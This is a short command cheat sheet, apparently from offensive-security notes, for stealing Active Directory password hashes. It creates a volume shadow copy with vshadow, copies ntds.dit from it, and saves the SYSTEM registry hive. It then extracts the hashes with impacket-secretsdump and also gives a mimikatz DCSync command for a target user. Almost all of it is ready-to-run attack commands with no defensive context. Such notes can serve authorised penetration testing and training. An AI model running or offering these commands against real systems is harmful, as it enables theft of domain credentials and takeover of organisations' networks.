vshadow.exe -nw -p  C:
#Take note of the "Shadow copy device name" in the output, as that is needed to copy the dump:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\ntds\ntds.dit C:\ntds.dit.bak
#The SYSTEM hive is also needed to extract from the dump:
reg.exe save hklm\system C:\system_hive.bak
#Then copy the files wherever and start extracting (LOCAL to define parsing files locally):
impacket-secretsdump -ntds ntds.dit.bak -system system_hive.bak LOCAL
#Or you can get hashes directly from DC with mimikatz if you have foothold on the DC:
lsadump::dcsync /user:testad\target-username
